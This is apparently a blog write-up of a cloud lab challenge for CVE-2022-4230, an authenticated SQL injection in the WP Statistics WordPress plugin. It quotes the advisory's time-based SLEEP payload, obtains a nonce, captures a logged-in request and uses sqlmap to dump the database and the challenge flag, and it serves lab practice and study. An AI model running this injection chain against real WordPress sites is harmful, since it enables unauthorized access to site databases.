---
title: "CVE-2022-4230"
date: 2024-07-24
tags: ["春秋云镜","CVE","WordPress"]
featured_image: "https://static.guyu.pro/yunjing.ichunqiu.com/CVE.webp"
draft: false
---

<https://wpscan.com/vulnerability/a0e40cfd-b217-481c-8fc4-027a0a023312>


## WP Statistics &lt; 13.2.9 - Authenticated SQLi


### Description

The plugin does not escape a parameter, which could allow authenticated users to perform SQL Injection attacks. By default, the affected feature is available to users with the manage_options capability (admin+), however the plugin has a settings to allow low privilege users to access it as well.

### Proof of Concept

```http
Log in as a user allowed to View WP Statistic and get a nonce via 

https://example.com/wp-admin/admin-ajax.php?action=rest-nonce

, and use it in the URL below, which will be delayed by 5s:

http://example.com/wp-json/wp-statistics/v2/metabox?_wpnonce=NONCE&name=words&search_engine=aaa%27%20AND%20(SELECT%205671%20FROM%20(SELECT(SLEEP(5)))Mdgs)--%20HsBR
```

## 演示

环境: [春秋云镜 免费空间>CVE-2022-4230](https://yunjing.ichunqiu.com/cve/detail/1165)

### 1.登录

站点名称 test  尝试 用户名`test` 密码 `test`

![](https://static.guyu.pro/yunjing.ichunqiu.com/1165/1.webp)

![](https://static.guyu.pro/yunjing.ichunqiu.com/1165/2.webp)


### 2.验证

<http://eci-2zeem9trz06di7iavwqk.cloudeci1.ichunqiu.com/wp-admin/admin-ajax.php?action=rest-nonce>

![](https://static.guyu.pro/yunjing.ichunqiu.com/1165/3.webp)

获得`373ec6388f`

替换利用url的NONCE值为`373ec6388f`

<http://eci-2zeem9trz06di7iavwqk.cloudeci1.ichunqiu.com/wp-json/wp-statistics/v2/metabox?_wpnonce=373ec6388f&name=words&search_engine=aaa%27%20AND%20(SELECT%205671%20FROM%20(SELECT(SLEEP(5)))Mdgs)--%20HsBR>

![](https://static.guyu.pro/yunjing.ichunqiu.com/1165/4.webp)

### 3.利用

<http://eci-2zeem9trz06di7iavwqk.cloudeci1.ichunqiu.com/wp-json/wp-statistics/v2/metabox?_wpnonce=373ec6388f&name=words&search_engine=aaa> 因为要在已登录状态注入，需要带上cookie

![](https://static.guyu.pro/yunjing.ichunqiu.com/1165/5.webp)

保存为1165，在url地址参数`search_engine=aaa`后添加`*`，让sqlmap指定位置注入

```http
GET /wp-json/wp-statistics/v2/metabox?_wpnonce=373ec6388f&name=words&search_engine=aaa* HTTP/1.1
Host: eci-2zeem9trz06di7iavwqk.cloudeci1.ichunqiu.com
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: Hm_lvt_2d0601bd28de7d49818249cf35d95943=1721788611; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1721788611; HMACCOUNT=2484925BEB32E239; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_c2b05042e81e305748a3152f767ae796=test%7C1721961933%7C6aDuiQPvnYxV9n8rJoFMRrb2lLidmM44qJCWIkWBhpL%7C760092fb3e6b0d9fc2c20b27b5f932cc58550f89e95c485856a99d346212a418; wp-settings-time-1=1721789134
Connection: close
```

使用sqlmap注入

```bash
$ sqlmap -r 1165
[23:16:02] [INFO] parsing HTTP request from '1165'
custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] y
[23:16:04] [INFO] testing connection to the target URL
[23:16:04] [INFO] testing if the target URL content is stable
[23:16:05] [INFO] target URL content is stable
[23:16:05] [INFO] testing if URI parameter '#1*' is dynamic
[23:16:05] [WARNING] URI parameter '#1*' does not appear to be dynamic
[23:16:05] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
[23:16:05] [INFO] testing for SQL injection on URI parameter '#1*'
[23:16:05] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[23:16:06] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[23:16:06] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[23:16:07] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[23:16:08] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[23:16:08] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[23:16:09] [INFO] testing 'Generic inline queries'
[23:16:09] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[23:16:10] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[23:16:11] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[23:16:11] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[23:16:22] [INFO] URI parameter '#1*' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y
[23:16:35] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[23:16:35] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[23:16:39] [INFO] checking if the injection point on URI parameter '#1*' is a false positive
URI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
sqlmap identified the following injection point(s) with a total of 75 HTTP(s) requests:
---
Parameter: #1* (URI)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: http://eci-2zeem9trz06di7iavwqk.cloudeci1.ichunqiu.com/wp-json/wp-statistics/v2/metabox?_wpnonce=373ec6388f&name=words&search_engine=aaa' AND (SELECT 8907 FROM (SELECT(SLEEP(5)))nhIB) AND 'aFnu'='aFnu
---
[23:17:06] [INFO] the back-end DBMS is MySQL
[23:17:06] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y
web application technology: PHP 7.4.33
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[23:17:49] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/eci-2zeem9trz06di7iavwqk.cloudeci1.ichunqiu.com'

$ sqlmap -r 1165 --batch --current-db
current database: 'wordpress'

$ sqlmap -r 1165 --batch --tables -D wordpress
[23:31:20] [INFO] retrieved: flag

$ sqlmap -r 1165 --batch --dump -D wordpress -T flag
Database: wordpress
Table: flag
[1 entry]
+--------------------------------------------+
| flag                                       |
+--------------------------------------------+
| flag{7f698f8b-2cde-4f19-ab79-5e96778812d4} |
+--------------------------------------------+
```

